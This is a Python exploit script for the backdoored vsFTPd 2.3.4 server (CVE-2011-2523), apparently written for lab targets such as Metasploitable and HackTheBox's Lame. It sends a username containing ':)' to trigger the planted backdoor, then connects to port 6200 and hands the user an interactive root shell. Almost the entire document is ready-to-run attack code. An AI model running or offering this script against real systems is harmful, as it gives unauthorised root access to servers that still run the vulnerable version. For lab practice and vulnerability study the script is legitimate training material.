# vsFTPd 2.3.4 Backdoor exploit

# tested on METASPLOITABLE, and LAME box (HackTheBox)
# In order to test it on LAME box, you'll need a root access to disable the firewall rule on port 6200 like so:
# "ufw allow 6200"

# Based on:
# https://exploit-db.com/exploits/49757

from telnetlib import Telnet 
from signal import signal, SIGINT
import sys

##########################################################
#   FUNCTIONS
##########################################################

def cleaner(signal_received, frame):
	print('[+] Exiting...')
	sys.exit(0)

def handle(host, port):
	signal(SIGINT, cleaner)                           
	username = "USER gwyo:)"
	password = "PASS random123"

	print('[+] Trying to trigger the malicious function vsf_sysutil_extra()')
	print('[+]         https://pastebin.com/AetT9sS5')
	opener = Telnet(host, port)
	opener.read_until(b"(vsFTPd 2.3.4)")
	opener.write(username.encode('ascii') + b"\n")
	opener.read_until(b"password.")
	opener.write(password.encode('ascii') + b"\n")

	print('[+] Spawning root shell\n')

	conn = Telnet(host, 6200)
	print('Send "exit" to quit shell')
	conn.interact()
	conn.close()

def show_usage():
	print('[+] Usage: %s <TARGET_IP> (<TARGET_PORT>) ' % sys.argv[0])
	print('[+] Example: %s 10.10.10.10 21' % sys.argv[0])
	print('[+] Example: %s 10.10.10.10' % sys.argv[0])
	sys.exit(-1)

##########################################################
#   MAIN
##########################################################

def main():
	print('[+] CVE-2011-2523: Backdoored vsFTPd 2.3.4 exploit\n')
	try:
		target = sys.argv[1]
		if len(sys.argv) > 2:
			port = sys.argv[2]
		else:
			port = 21
	except IndexError:
		show_usage()
	try:
		handle(target, int(port))
	except KeyboardInterrupt:
		sys.exit(1)
	except Exception:
		sys.exit(1)

if __name__ == "__main__":
	main()
